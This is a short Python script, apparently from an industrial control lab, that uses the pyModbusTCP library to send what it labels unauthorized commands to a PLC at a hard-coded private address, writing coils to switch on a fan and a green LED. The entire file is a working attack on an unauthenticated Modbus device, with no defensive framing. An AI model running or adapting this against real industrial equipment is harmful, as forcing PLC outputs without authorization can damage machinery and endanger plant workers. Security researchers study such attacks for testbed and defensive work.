from pyModbusTCP.client import ModbusClient
import sys

# Function to find the PLC's IP address (placeholder for actual logic)
def find_plc_ip():
    # Replace this with actual logic to find the PLC's IP address
    # For example, you could scan the network or use a predefined list of IPs
    return "192.168.9.24"  # Placeholder IP

# Function to send unauthorized command to the PLC
def send_unauthorized_command(ip_address):
    try:
        # Create a Modbus TCP client
        client = ModbusClient(host=ip_address, port=502, auto_open=True, auto_close=True)

        # Unauthorized command: Turn on the fan (Q_FAN at %Q0.0)
        # Write a single coil (Modbus function code 0x05)
        coil_address = 0  # %Q0.0 corresponds to coil address 0
        value = True  # Turn on the coil
        success = client.write_single_coil(coil_address, value)

        if success:
            print(f"Successfully sent unauthorized command to turn on the fan at {ip_address}.")
        else:
            print(f"Failed to send unauthorized command to {ip_address}.")

        # Unauthorized command: Turn on the Green LED (Q_GREENA at %Q0.5)
        coil_address = 5  # %Q0.5 corresponds to coil address 5
        value = True  # Turn on the coil
        success = client.write_single_coil(coil_address, value)

        if success:
            print(f"Successfully sent unauthorized command to turn on the Green LED at {ip_address}.")
        else:
            print(f"Failed to send unauthorized command to turn on the Green LED at {ip_address}.")

    except Exception as e:
        print(f"An error occurred: {e}")

if __name__ == "__main__":
    # Step 1: Find the PLC's IP address
    plc_ip = find_plc_ip()
    if not plc_ip:
        print("Could not find the PLC's IP address.")
        sys.exit(1)

    print(f"Found PLC at IP address: {plc_ip}")

    # Step 2: Send unauthorized commands to the PLC
    send_unauthorized_command(plc_ip)